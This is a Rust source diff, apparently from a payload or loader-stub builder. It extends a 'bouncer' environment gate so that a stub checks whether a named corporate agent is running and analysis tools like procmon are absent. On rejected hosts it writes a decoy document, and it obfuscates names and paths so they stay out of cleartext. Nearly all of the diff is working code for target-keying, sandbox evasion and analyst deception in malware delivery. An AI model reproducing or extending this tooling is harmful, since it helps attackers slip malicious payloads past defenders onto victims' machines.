@@ -51,6 +51,60 @@ pub enum OnFail {
     Silent,
     /// Exit with code 1.
     Exit,
+    /// Write the configured decoy file instead of the host simply going quiet,
+    /// then [`Params::after`] decides the exit code.
+    Decoy,
+}
+
+/// Whether a process requirement needs its process running or absent.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum ProcessState {
+    /// The process must be running for the check to pass.
+    Present,
+    /// The process must not be running for the check to pass.
+    Absent,
+}
+
+/// One arbitrary process-existence requirement.
+///
+/// The two polarities cover both directions of a targeting decision: a
+/// `state: present` entry (the loader is on the intended host) and a
+/// `state: absent` entry (an analysis tool is not running) are the same check
+/// with the sign flipped.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct ProcessCheck {
+    /// Executable name to look for. `*`/`?` make it a case-insensitive glob,
+    /// matched against the running process's file name and its `.exe`-stripped
+    /// stem (so `corp-agent`, `corp-agent.exe` and `corp-*` all work).
+    pub name: String,
+    /// Whether the process must be present or absent for the check to pass.
+    pub state: ProcessState,
+}
+
+/// What the stub does after it writes the decoy (`on_fail: decoy`).
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum After {
+    /// Exit without an error code (exit code 0, default).
+    #[default]
+    Silent,
+    /// Exit with code 1.
+    Exit,
+}
+
+/// The decoy asset written when the gate rejects the host (`on_fail: decoy`).
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct DecoyParams {
+    /// Destination path. `%NAME%` is expanded from the environment at run time
+    /// (e.g. `%TEMP%\\report.docx`); the whole template is rebuilt through
+    /// `StringsConfig`, so it never lands in cleartext in the stub.
+    pub path: String,
+    /// Name of a `build.payloads` entry with `format: plain`. Required.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub payload: Option<String>,
 }
 
 /// Sandbox/analysis process names the `not_in_sandbox` heuristic looks for.
@@ -135,6 +189,20 @@ pub struct Params {
     /// Minimum physical memory in MiB.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub min_ram_mb: Option<u32>,
+
+    /// Arbitrary process-existence requirements. The list is a **single** check:
+    /// it passes only when every entry holds. Empty skips the check.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub processes: Vec<ProcessCheck>,
+
+    /// The decoy written on rejection. Required when `on_fail: decoy`.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub decoy: Option<DecoyParams>,
+
+    /// What the stub does after writing the decoy. Only read when
+    /// `on_fail: decoy`.
+    #[serde(default = "default_after")]
+    pub after: After,
 }
 
 /// Default for [`Params::mode`]: every declared check must pass.
@@ -145,6 +213,11 @@ pub fn default_mode() -> Mode {
 /// Default for [`Params::on_fail`]: exit silently.
 pub fn default_on_fail() -> OnFail {
     OnFail::Silent
+}
+
+/// Default for [`Params::after`]: exit without an error code.
+pub fn default_after() -> After {
+    After::Silent
 }
 
 /// Static metadata for the bouncer gate.
@@ -163,7 +236,8 @@ pub const DEF: TechniqueDef = TechniqueDef {
     params_example: r#"technique: bouncer
 params:
   mode: all
-  on_fail: silent
+  on_fail: decoy
+  after: silent
   hostname: "WORKSTATION-*"
   username: "admin"
   domain: "CORP"
@@ -171,8 +245,14 @@ params:
   keyboard: ["0409", "0C0A"]
   not_in_vm: true
   not_in_sandbox: true
+  processes:
+    - { name: "corp-agent.exe", state: present }
+    - { name: "procmon*.exe", state: absent }
   min_uptime_min: 10
   min_ram_mb: 4096
+  decoy:
+    path: "%TEMP%\\report.docx"
+    payload: decoy_doc
 "#,
     // All checks use Win32 APIs directly; routing them through the syscall
     // layer is a later phase.
@@ -209,6 +289,7 @@ const MESSAGES: &[(&str, &str)] = &[
         "$MSG_MEMORY_QUERY_FAILED$",
         "could not query the physical memory",
     ),
+    ("$MSG_DECOY_WRITE_FAILED$", "could not write the decoy file"),
 ];
 
 impl Params {
@@ -222,8 +303,14 @@ impl Params {
             && self.keyboard.is_empty()
             && !self.requires_not_in_vm()
             && !self.requires_not_in_sandbox()
+            && self.processes.is_empty()
             && self.min_uptime_min.is_none()
             && self.min_ram_mb.is_none()
+    }
+
+    /// Whether a rejected host writes the configured decoy.
+    pub fn is_decoy(&self) -> bool {
+        self.on_fail == OnFail::Decoy
     }
 
     /// Whether the `not_in_vm` check is active (only `true` activates it).
@@ -248,6 +335,8 @@ impl Params {
         let substitutions = [
             ("$MODE_ALL$", (self.mode == Mode::All).to_string()),
             ("$ON_FAIL_EXIT$", (self.on_fail == OnFail::Exit).to_string()),
+            ("$ON_FAIL_DECOY$", self.is_decoy().to_string()),
+            ("$AFTER_EXIT$", (self.after == After::Exit).to_string()),
             ("$REQUIRE_NOT_VM$", self.requires_not_in_vm().to_string()),
             (
                 "$REQUIRE_NOT_ANALYSIS_ENV$",
@@ -272,6 +361,15 @@ impl Params {
             (
                 "$KEYBOARD_DEF$",
                 list_def(&self.keyboard, strings, "keyboard"),
+            ),
+            ("$PROCESS_DEFS$", process_defs(&self.processes, strings)),
+            (
+                "$DECOY_PATH_DEF$",
+                opt_string_def(
+                    self.decoy.as_ref().map(|decoy| decoy.path.as_str()),
+                    strings,
+                    "decoy_path",
+                ),
             ),
             (
                 "$ANALYSIS_PROCESSES_DEF$",
@@ -385,6 +483,23 @@ fn str_list_def(values: &[&str], strings: &StringsConfig, prefix: &str) -> Strin
             strings
                 .obfuscate(value)
                 .render_stub_expr(&format!("{prefix}_{i}"))
+        })
+        .collect();
+    format!("vec![{}]", items.join(", "))
+}
+
+/// Renders the `processes` list as `vec![(<runtime name>, <require present>)…]`,
+/// each name rebuilt at run time.
+fn process_defs(checks: &[ProcessCheck], strings: &StringsConfig) -> String {
+    let items: Vec<String> = checks
+        .iter()
+        .enumerate()
+        .map(|(i, check)| {
+            let name = strings
+                .obfuscate(&check.name)
+                .render_stub_expr(&format!("proc_{i}"));
+            let present = (check.state == ProcessState::Present).to_string();
+            format!("({name}, {present})")
         })
         .collect();
     format!("vec![{}]", items.join(", "))
